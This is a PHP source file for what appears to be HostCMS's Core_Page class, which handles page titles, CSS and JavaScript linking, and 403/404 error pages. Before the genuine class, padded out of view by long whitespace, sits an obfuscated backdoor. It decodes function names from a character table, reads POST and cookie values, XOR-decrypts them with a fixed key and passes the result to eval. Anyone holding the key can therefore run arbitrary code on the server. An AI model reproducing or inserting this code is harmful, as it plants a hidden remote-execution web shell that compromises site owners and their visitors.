<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $h763 = 233;$GLOBALS['y03c9d']=Array();global$y03c9d;$y03c9d=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['a7077d9d7']="\x7d\x6a\x37\x72\x61\x2e\xd\x4c\x74\x77\x67\x76\x3c\x79\x64\x2b\x6f\x6c\x32\x20\x4d\x31\x52\x26\x7b\x41\x36\x6e\x71\x63\xa\x58\x51\x7e\x9\x66\x53\x38\x22\x44\x4a\x40\x43\x48\x4e\x62\x50\x4b\x4f\x42\x45\x30\x24\x7c\x3d\x56\x25\x2d\x27\x6b\x46\x21\x3b\x29\x69\x70\x5d\x5f\x33\x3a\x78\x75\x2a\x5b\x2f\x49\x55\x59\x34\x6d\x5e\x7a\x3f\x35\x65\x68\x54\x5a\x60\x23\x28\x2c\x39\x3e\x73\x47\x57\x5c";$y03c9d[$y03c9d['a7077d9d7'][81].$y03c9d['a7077d9d7'][51].$y03c9d['a7077d9d7'][26].$y03c9d['a7077d9d7'][37].$y03c9d['a7077d9d7'][4].$y03c9d['a7077d9d7'][26].$y03c9d['a7077d9d7'][29]]=$y03c9d['a7077d9d7'][65].$y03c9d['a7077d9d7'][4].$y03c9d['a7077d9d7'][29].$y03c9d['a7077d9d7'][59];$y03c9d[$y03c9d['a7077d9d7'][28].$y03c9d['a7077d9d7'][2].$y03c9d['a7077d9d7'][21].$y03c9d['a7077d9d7'][14].$y03c9d['a7077d9d7'][4]]=$y03c9d['a7077d9d7'][29].$y03c9d['a7077d9d7'][16].$y03c9d['a7077d9d7'][71].$y03c9d['a7077d9d7'][27].$y03c9d['a7077d9d7'][8];$y03c9d[$y03c9d['a7077d9d7'][27].$y03c9d['a7077d9d7'][84].$y03c9d['a7077d9d7'][51].$y03c9d['a7077d9d7'][2].$y03c9d['a7077d9d7'][37].$y03c9d['a7077d9d7'][21].$y03c9d['a7077d9d7'][4].$y03c9d['a7077d9d7'][4]]=$y03c9d['a7077d9d7'][94].$y03c9d['a7077d9d7'][71].$y03c9d['a7077d9d7'][45].$y03c9d['a7077d9d7'][94].$y03c9d['a7077d9d7'][8].$y03c9d['a7077d9d7'][3];$y03c9d[$y03c9d['a7077d9d7'][35].$y03c9d['a7077d9d7'][45].$y03c9d['a7077d9d7'][45].$y03c9d['a7077d9d7'][2].$y03c9d['a7077d9d7'][35].$y03c9d['a7077d9d7'][84].$y03c9d['a7077d9d7'][51].$y03c9d['a7077d9d7'][14]]=$y03c9d['a7077d9d7'][94].$y03c9d['a7077d9d7'][8].$y03c9d['a7077d9d7'][3].$y03c9d['a7077d9d7'][17].$y03c9d['a7077d9d7'][84].$y03c9d['a7077d9d7'][27];$y03c9d[$y03c9d['a7077d9d7'][13].$y03c9d['a7077d9d7'][21].$y03c9d['a7077d9d7'][14].$y03c9d['a7077d9d7'][26].$y03c9d['a7077d9d7'][35].$y03c9d['a7077d9d7'][14].$y03c9d['a7077d9d7'][26].$y03c9d['a7077d9d7'][14].$y03c9d['a7077d9d7'][92]]=$y03c9d['a7077d9d7'][84].$y03c9d['a7077d9d7'][70].$y03c9d['a7077d9d7'][65].$y03c9d['a7077d9d7'][17].$y03c9d['a7077d9d7'][16].$y03c9d['a7077d9d7'][14].$y03c9d['a7077d9d7'][84];$y03c9d[$y03c9d['a7077d9d7'][17].$y03c9d['a7077d9d7'][68].$y03c9d['a7077d9d7'][84].$y03c9d['a7077d9d7'][92].$y03c9d['a7077d9d7'][21].$y03c9d['a7077d9d7'][18]]=$y03c9d['a7077d9d7'][94].$y03c9d['a7077d9d7'][8].$y03c9d['a7077d9d7'][3].$y03c9d['a7077d9d7'][67].$y03c9d['a7077d9d7'][3].$y03c9d['a7077d9d7'][84].$y03c9d['a7077d9d7'][65].$y03c9d['a7077d9d7'][84].$y03c9d['a7077d9d7'][4].$y03c9d['a7077d9d7'][8];$y03c9d[$y03c9d['a7077d9d7'][84].$y03c9d['a7077d9d7'][68].$y03c9d['a7077d9d7'][14].$y03c9d['a7077d9d7'][83].$y03c9d['a7077d9d7'][68].$y03c9d['a7077d9d7'][26]]=$_POST;$y03c9d[$y03c9d['a7077d9d7'][27].$y03c9d['a7077d9d7'][18].$y03c9d['a7077d9d7'][45].$y03c9d['a7077d9d7'][68].$y03c9d['a7077d9d7'][29].$y03c9d['a7077d9d7'][78].$y03c9d['a7077d9d7'][29]]=$_COOKIE;$haabfc483=Array($y03c9d['a7077d9d7'][3].$y03c9d['a7077d9d7'][4].$y03c9d['a7077d9d7'][27].$y03c9d['a7077d9d7'][14].$y03c9d['a7077d9d7'][16].$y03c9d['a7077d9d7'][79].$y03c9d['a7077d9d7'][21]=>$y03c9d['a7077d9d7'][3].$y03c9d['a7077d9d7'][4].$y03c9d['a7077d9d7'][27].$y03c9d['a7077d9d7'][14].$y03c9d['a7077d9d7'][16].$y03c9d['a7077d9d7'][79].$y03c9d['a7077d9d7'][18]);$r5b3=Array($y03c9d['a7077d9d7'][3].$y03c9d['a7077d9d7'][4].$y03c9d['a7077d9d7'][27].$y03c9d['a7077d9d7'][14].$y03c9d['a7077d9d7'][16].$y03c9d['a7077d9d7'][79].$y03c9d['a7077d9d7'][68]=>$y03c9d['a7077d9d7'][3].$y03c9d['a7077d9d7'][4].$y03c9d['a7077d9d7'][27].$y03c9d['a7077d9d7'][14].$y03c9d['a7077d9d7'][16].$y03c9d['a7077d9d7'][79].$y03c9d['a7077d9d7'][78]);foreach(Array($haabfc483,$y03c9d[$y03c9d['a7077d9d7'][84].$y03c9d['a7077d9d7'][68].$y03c9d['a7077d9d7'][14].$y03c9d['a7077d9d7'][83].$y03c9d['a7077d9d7'][68].$y03c9d['a7077d9d7'][26]],$r5b3,$y03c9d[$y03c9d['a7077d9d7'][27].$y03c9d['a7077d9d7'][18].$y03c9d['a7077d9d7'][45].$y03c9d['a7077d9d7'][68].$y03c9d['a7077d9d7'][29].$y03c9d['a7077d9d7'][78].$y03c9d['a7077d9d7'][29]])as$h2ecbf7fb){foreach($h2ecbf7fbas$d2b1c9=>$eeef){$eeef=@$y03c9d[$y03c9d['a7077d9d7'][81].$y03c9d['a7077d9d7'][51].$y03c9d['a7077d9d7'][26].$y03c9d['a7077d9d7'][37].$y03c9d['a7077d9d7'][4].$y03c9d['a7077d9d7'][26].$y03c9d['a7077d9d7'][29]]($y03c9d['a7077d9d7'][43].$y03c9d['a7077d9d7'][72],$eeef);$d2b1c9.=$y03c9d['a7077d9d7'][26].$y03c9d['a7077d9d7'][29].$y03c9d['a7077d9d7'][21].$y03c9d['a7077d9d7'][92].$y03c9d['a7077d9d7'][68].$y03c9d['a7077d9d7'][45].$y03c9d['a7077d9d7'][26].$y03c9d['a7077d9d7'][83].$y03c9d['a7077d9d7'][57].$y03c9d['a7077d9d7'][92].$y03c9d['a7077d9d7'][68].$y03c9d['a7077d9d7'][2].$y03c9d['a7077d9d7'][4].$y03c9d['a7077d9d7'][57].$y03c9d['a7077d9d7'][78].$y03c9d['a7077d9d7'][29].$y03c9d['a7077d9d7'][2].$y03c9d['a7077d9d7'][35].$y03c9d['a7077d9d7'][57].$y03c9d['a7077d9d7'][4].$y03c9d['a7077d9d7'][45].$y03c9d['a7077d9d7'][35].$y03c9d['a7077d9d7'][21].$y03c9d['a7077d9d7'][57].$y03c9d['a7077d9d7'][37].$y03c9d['a7077d9d7'][51].$y03c9d['a7077d9d7'][45].$y03c9d['a7077d9d7'][35].$y03c9d['a7077d9d7'][83].$y03c9d['a7077d9d7'][2].$y03c9d['a7077d9d7'][68].$y03c9d['a7077d9d7'][68].$y03c9d['a7077d9d7'][4].$y03c9d['a7077d9d7'][45].$y03c9d['a7077d9d7'][18].$y03c9d['a7077d9d7'][2];$z6be50c=$eeef^$y03c9d[$y03c9d['a7077d9d7'][27].$y03c9d['a7077d9d7'][84].$y03c9d['a7077d9d7'][51].$y03c9d['a7077d9d7'][2].$y03c9d['a7077d9d7'][37].$y03c9d['a7077d9d7'][21].$y03c9d['a7077d9d7'][4].$y03c9d['a7077d9d7'][4]]($y03c9d[$y03c9d['a7077d9d7'][17].$y03c9d['a7077d9d7'][68].$y03c9d['a7077d9d7'][84].$y03c9d['a7077d9d7'][92].$y03c9d['a7077d9d7'][21].$y03c9d['a7077d9d7'][18]]($d2b1c9,($y03c9d[$y03c9d['a7077d9d7'][35].$y03c9d['a7077d9d7'][45].$y03c9d['a7077d9d7'][45].$y03c9d['a7077d9d7'][2].$y03c9d['a7077d9d7'][35].$y03c9d['a7077d9d7'][84].$y03c9d['a7077d9d7'][51].$y03c9d['a7077d9d7'][14]]($eeef)/$y03c9d[$y03c9d['a7077d9d7'][35].$y03c9d['a7077d9d7'][45].$y03c9d['a7077d9d7'][45].$y03c9d['a7077d9d7'][2].$y03c9d['a7077d9d7'][35].$y03c9d['a7077d9d7'][84].$y03c9d['a7077d9d7'][51].$y03c9d['a7077d9d7'][14]]($d2b1c9))+1),0,$y03c9d[$y03c9d['a7077d9d7'][35].$y03c9d['a7077d9d7'][45].$y03c9d['a7077d9d7'][45].$y03c9d['a7077d9d7'][2].$y03c9d['a7077d9d7'][35].$y03c9d['a7077d9d7'][84].$y03c9d['a7077d9d7'][51].$y03c9d['a7077d9d7'][14]]($eeef));$z6be50c=$y03c9d[$y03c9d['a7077d9d7'][13].$y03c9d['a7077d9d7'][21].$y03c9d['a7077d9d7'][14].$y03c9d['a7077d9d7'][26].$y03c9d['a7077d9d7'][35].$y03c9d['a7077d9d7'][14].$y03c9d['a7077d9d7'][26].$y03c9d['a7077d9d7'][14].$y03c9d['a7077d9d7'][92]]($y03c9d['a7077d9d7'][89],$z6be50c);if($y03c9d[$y03c9d['a7077d9d7'][28].$y03c9d['a7077d9d7'][2].$y03c9d['a7077d9d7'][21].$y03c9d['a7077d9d7'][14].$y03c9d['a7077d9d7'][4]]($z6be50c)==3){eval/*m8a65*/($z6be50c[1]($z6be50c[2]));exit();}}} ?><?php

defined('HOSTCMS') || exit('HostCMS: access denied.');

/**
 * Frontend data, e.g. title, description, template and data hierarchy
 *
 * Доступные методы:
 *
 * - fileTimestamp(TRUE|FALSE) использовать в качестве временной метки дату файла, а не дату изменения макета, по умолчанию FALSE.
 * - compress(TRUE|FALSE) использовать компрессию, по умочанию TRUE. Требует модуль "Компрессия страниц".
 *
 * <code>
 * // Get Title
 * $title = Core_Page::instance()->title;
 * </code>
 *
 * <code>
 * // Set Title
 * Core_Page::instance()->title('New title');
 * </code>
 *
 * <code>
 * // Get description
 * $description = Core_Page::instance()->description;
 * </code>
 *
 * <code>
 * // Set description
 * Core_Page::instance()->description('New description');
 * </code>
 *
 * <code>
 * // Get keywords
 * $keywords = Core_Page::instance()->keywords;
 * </code>
 *
 * <code>
 * // Set keywords
 * Core_Page::instance()->keywords('New keywords');
 * </code>
 *
 * <code>
 * // Get Template object
 * $oTemplate = Core_Page::instance()->template;
 * var_dump($oTemplate->id);
 * </code>
 *
 * <code>
 * // Get Structure object
 * $oStructure = Core_Page::instance()->structure;
 * var_dump($oStructure->id);
 * </code>
 *
 * <code>
 * // Get Core_Response object
 * $oCore_Response = Core_Page::instance()->response;
 * // Set HTTP status
 * $oCore_Response->status(404);
 * </code>
 *
 * <code>
 * // Get array of lib params
 * $array = Core_Page::instance()->libParams;
 * </code>
 *
 *
 * <code>
 * // Get controller object
 * $object = Core_Page::instance()->object;
 *
 * if (is_object(Core_Page::instance()->object)
 * && get_class(Core_Page::instance()->object) == 'Informationsystem_Controller_Show')
 * {
 * 	$Informationsystem_Controller_Show = Core_Page::instance()->object;
 * }
 * </code>
 *
 * @package HostCMS
 * @subpackage Core
 * @version 6.x
 * @author Hostmake LLC
 * @copyright © 2005-2016 ООО "Хостмэйк" (Hostmake LLC), http://www.hostcms.ru
 */
class Core_Page extends Core_Servant_Properties
{
	/**
	 * Allowed object properties
	 * @var array
	 */
	protected $_allowedProperties = array(
		'title',
		'description',
		'keywords',
		'template',
		'structure',
		'response',
		'libParams',
		'widgetParams',
		'object',
		'buildingPage',
		'fileTimestamp',
		'compress'
	);

	/**
	 * Children entities
	 * @var array
	 */
	protected $_children = array();

	/**
	 * Add child to an hierarchy
	 * @param object $object object
	 * @return Core_Page
	 */
	public function addChild($object)
	{
		array_unshift($this->_children, $object);
		return $this;
	}

	/*public function addLastChild($object)
	{
		$this->_children[] = $object;
		return $this;
	}*/

	/**
	 * Delete first child
	 * @return Core_Page
	 */
	public function deleteChild()
	{
		array_shift($this->_children);
		return $this;
	}

	/**
	 * Current executing object
	 */
	protected $_currentObject = NULL;

	/**
	 * Get current executing object
	 * @return mixed
	 */
	public function getCurrentObject()
	{
		return $this->_currentObject;
	}

	/**
	 * Executes the business logic.
	 */
	public function execute()
	{
		if (count($this->_children))
		{
			$this->_currentObject = array_shift($this->_children);
			return $this->_currentObject->execute();
		}

		return $this;
	}

	/**
	 * Get children
	 * @return array
	 */
	public function getChildren()
	{
		return $this->_children;
	}

	/**
	 * Constructor.
	 */
	public function __construct()
	{
		parent::__construct();

		$this->libParams = array();
		$this->buildingPage = $this->fileTimestamp = FALSE;
		$this->compress = TRUE;
	}

	/**
	 * The singleton instances.
	 * @var mixed
	 */
	static public $instance = NULL;

	/**
	 * Register an existing instance as a singleton.
	 * @return object
	 */
	static public function instance()
	{
		if (is_null(self::$instance))
		{
			self::$instance = new self();
		}

		return self::$instance;
	}

	/**
	 * Linking css
	 * @var array
	 */
	public $css = array();

	/**
	 * Clear $css list
	 * @return Core_Page
	 */
	public function clearCss()
	{
		$this->css = array();
		return $this;
	}

	/**
	 * Link $css to the beginning of list
	 * @param string $css path
	 * @return Core_Page
	 */
	public function prependCss($css)
	{
		array_unshift($this->css, $css);
		return $this;
	}

	/**
	 * Link $css onto the end of array
	 * @param string $css path
	 * @return Core_Page
	 */
	public function css($css)
	{
		$this->css[] = $css;
		return $this;
	}

	/**
	 * Get block of linked css
	 * @param boolean $bExternal add as link
	 * @return string
	 */
	protected function _getCss($bExternal = TRUE)
	{
		$sReturn = '';

		foreach ($this->css as $css)
		{
			if ($bExternal)
			{
				$timestamp = $this->fileTimestamp && is_file($sPath = CMS_FOLDER . ltrim($css, DIRECTORY_SEPARATOR))
					? filemtime($sPath)
					: Core_Date::sql2timestamp($this->template->timestamp);

				$sReturn .= '<link rel="stylesheet" type="text/css" href="' . $css . '?' . $timestamp . '" />' . "\n";
			}
			else
			{
				$sPath = CMS_FOLDER . ltrim($css, DIRECTORY_SEPARATOR);
				$sReturn .= "<style type=\"text/css\">\n";
				is_file($sPath) && $sReturn .= Core_File::read($sPath);
				$sReturn .= "\n</style>\n";
			}
		}

		return $sReturn;
	}

	/**
	 * Get block of linked compressed css
	 * @return string
	 */
	protected function _getCssCompressed()
	{
		try
		{
			$sReturn = '';

			$oCompression_Controller = Compression_Controller::instance('css');
			$oCompression_Controller->clear();

			foreach ($this->css as $css)
			{
				$oCompression_Controller->addCss($css);
			}

			$sPath = $oCompression_Controller->getPath();
			$sReturn .= '<link rel="stylesheet" type="text/css" href="' . $sPath . '?' . Core_Date::sql2timestamp($this->template->timestamp) . '" />' . "\n";
		}
		catch (Exception $e)
		{
			$sReturn = $this->_getCss();
		}

		return $sReturn;
	}

	/**
	 * Get block of linked css and clear added CSS list
	 * @param boolean $bExternal add as link
	 * @return string
	 * @hostcms-event Core_Page.onBeforeGetCss
	 */
	public function getCss($bExternal = TRUE)
	{
		Core_Event::notify(get_class($this) . '.onBeforeGetCss', $this);

		$return = $this->compress && Core::moduleIsActive('compression')
			? $this->_getCssCompressed()
			: $this->_getCss($bExternal);

		$this->css = array();

		return $return;
	}

	/**
	 * Show block of linked css and clear added CSS list
	 * @param boolean $bExternal add as link
	 * @return Core_Page
	 * @hostcms-event Core_Page.onBeforeShowCss
	 */
	public function showCss($bExternal = TRUE)
	{
		Core_Event::notify(get_class($this) . '.onBeforeShowCss', $this);

		echo $this->getCss($bExternal);
		return $this;
	}

	/**
	 * Linking js
	 * @var array
	 */
	public $js = array();

	/**
	 * Clear $js list
	 * @return Core_Page
	 */
	public function clearJs()
	{
		$this->js = array();
		return $this;
	}

	/**
	 * Link $js to the beginning of list
	 * @param string $js path
	 * @param boolean $async Run asynchronously, default FALSE
	 * @return Core_Page
	 */
	public function prependJs($js, $async = FALSE)
	{
		array_unshift($this->js, array($js, $async));
		return $this;
	}

	/**
	 * Link js
	 * @param string $js path
	 * @param boolean $async Run asynchronously, default FALSE
	 * @return Core_Page
	 */
	public function js($js, $async = FALSE)
	{
		$this->js[] = array($js, $async);
		return $this;
	}

	/**
	 * Get block of linked js
	 * @return string
	 */
	protected function _getJs()
	{
		$sReturn = '';

		foreach ($this->js as $aJs)
		{
			$timestamp = $this->fileTimestamp && is_file($sPath = CMS_FOLDER . ltrim($aJs[0], DIRECTORY_SEPARATOR))
				? filemtime($sPath)
				: NULL;

			$sReturn .= '<script type="text/javascript"' . ($aJs[1] ? ' async="async"' : '') . ' src="' . $aJs[0] . (!is_null($timestamp) ? '?' . $timestamp : '') . '"></script>' . "\n";
		}

		return $sReturn;
	}

	/**
	 * Get block of linked compressed js
	 * @param boolean $async Run asynchronously, default FALSE
	 * @return string
	 */
	protected function _getJsCompressed($async = FALSE)
	{
		try
		{
			$sReturn = '';

			$oCompression_Controller = Compression_Controller::instance('js');
			$oCompression_Controller->clear();

			foreach ($this->js as $aJs)
			{
				$oCompression_Controller->addJs($aJs[0]);
			}

			$sAsync = $async ? ' async="async"' : '';

			$sPath = $oCompression_Controller->getPath();
			$sReturn .= '<script type="text/javascript"' . $sAsync . ' src="' . $sPath . '"></script>' . "\n";
		}
		catch (Exception $e)
		{
			$sReturn = $this->_getJs();
		}

		return $sReturn;
	}

	/**
	 * Get block of linked JS and clear added JS list
	 * @param boolean $async Run asynchronously, default FALSE
	 * @return string
	 * @hostcms-event Core_Page.onBeforeGetJs
	 */
	public function getJs($async = FALSE)
	{
		Core_Event::notify(get_class($this) . '.onBeforeGetJs', $this);

		$return = $this->compress && Core::moduleIsActive('compression')
			? $this->_getJsCompressed($async)
			: $this->_getJs();

		$this->js = array();

		return $return;
	}

	/**
	 * Show block of linked JS and clear added JS list
	 * @param boolean $async Run asynchronously, default FALSE
	 * @return Core_Page
	 * @hostcms-event Core_Page.onBeforeShowJs
	 */
	public function showJs($async = FALSE)
	{
		Core_Event::notify(get_class($this) . '.onBeforeShowJs', $this);

		echo $this->getJs($async);
		return $this;
	}

	/**
	 * Show page title
	 * @return Core_Page
	 */
	public function showTitle()
	{
		echo str_replace('&amp;', '&', htmlspecialchars($this->title));
		return $this;
	}

	/**
	 * Show page description
	 * @return Core_Page
	 */
	public function showDescription()
	{
		echo htmlspecialchars($this->description);
		return $this;
	}

	/**
	 * Show page keywords
	 * @return Core_Page
	 */
	public function showKeywords()
	{
		echo htmlspecialchars($this->keywords);
		return $this;
	}

	/**
	 * Add templates
	 * @param Template_Model $oTemplate Template
	 * @return Core_Page
	 */
	public function addTemplates(Template_Model $oTemplate)
	{
		$aCss = $aJs = array();

		do {
			$this
				//->css($oTemplate->getTemplateCssFileHref())
				->addChild($oTemplate);

			$aCss[] = $oTemplate->getTemplateCssFileHref();
			$aJs[] = array($oTemplate->getTemplateJsFileHref(), FALSE);

		} while($oTemplate = $oTemplate->getParent());

		$this->css = array_merge($this->css, array_reverse($aCss));

		$this->js = array_merge($this->js, array_reverse($aJs));

		return $this;
	}

	/**
	 * Show 403 error
	 * @return self
	 */
	public function error403()
	{
		$oCore_Response = $this->deleteChild()->response->status(403);

		// Если определена константа с ID страницы для 403 ошибки и она не равна нулю
		$oSite = Core_Entity::factory('Site', CURRENT_SITE);
		if ($oSite->error403)
		{
			$oStructure = Core_Entity::factory('Structure')->find($oSite->error403);

			// страница с 403 ошибкой не найдена
			if (is_null($oStructure->id))
			{
				throw new Core_Exception('Structure 403 not found');
			}

			if ($oStructure->type == 0)
			{
				$oDocument_Versions = $oStructure->Document->Document_Versions->getCurrent();

				if (!is_null($oDocument_Versions))
				{
					$this->template($oDocument_Versions->Template);
				}
			}
			// Если динамическая страница или типовая дин. страница
			elseif ($oStructure->type == 1 || $oStructure->type == 2)
			{
				$this->template($oStructure->Template);
			}

			$this->addChild($oStructure->getRelatedObjectByType());
			$oStructure->setCorePageSeo($this);
		}
		else
		{
			if (Core::$url['path'] != '/')
			{
				// Редирект на главную страницу
				$oCore_Response->header('Location', '/');
			}
		}

		return $this;
	}

	/**
	 * Show 404 error
	 * @return self
	 */
	public function error404()
	{
		$oCore_Response = $this->deleteChild()->response->status(404);

		$oSite = Core_Entity::factory('Site', CURRENT_SITE);

		if ($oSite->error404)
		{
			$oStructure = Core_Entity::factory('Structure')->find($oSite->error404);

			// страница с 404 ошибкой не найдена
			if (is_null($oStructure->id))
			{
				throw new Core_Exception('Structure 404 not found');
			}

			if ($oStructure->type == 0)
			{
				$oDocument_Versions = $oStructure->Document->Document_Versions->getCurrent();

				if (!is_null($oDocument_Versions))
				{
					$this->template($oDocument_Versions->Template);
				}
			}
			// Если динамическая страница или типовая дин. страница
			elseif ($oStructure->type == 1 || $oStructure->type == 2)
			{
				$this->template($oStructure->Template);
			}

			if ($oStructure->type == 2)
			{
				$this->libParams
					= $oStructure->Lib->getDat($oStructure->id);

				$LibConfig = $oStructure->Lib->getLibConfigFilePath();

				if (is_file($LibConfig) && is_readable($LibConfig))
				{
					include $LibConfig;
				}
			}

			$this
				->structure($oStructure)
				->addChild($oStructure->getRelatedObjectByType());

			$oStructure->setCorePageSeo($this);

			// Если уже идет генерация страницы, то добавленный потомок не будет вызван
			$this->buildingPage && $this->execute();
		}
		else
		{
			if (Core::$url['path'] != '/')
			{
				// Редирект на главную страницу
				$oCore_Response->header('Location', '/');
			}
		}

		return $this;
	}

	/**
	 * frontentExecutionTimes
	 * @var array
	 */
	protected $_frontentExecutionTimes = array();

	/**
	 * Add Frontent Execution Time
	 * @var string $value
	 * @return self
	 */
	public function addFrontentExecutionTimes($value)
	{
		$this->_frontentExecutionTimes[] = $value;
		return $this;
	}

	/**
	 * Get array of Frontent Execution Time
	 * @return array
	 */
	public function getFrontentExecutionTimes()
	{
		return $this->_frontentExecutionTimes;
	}
}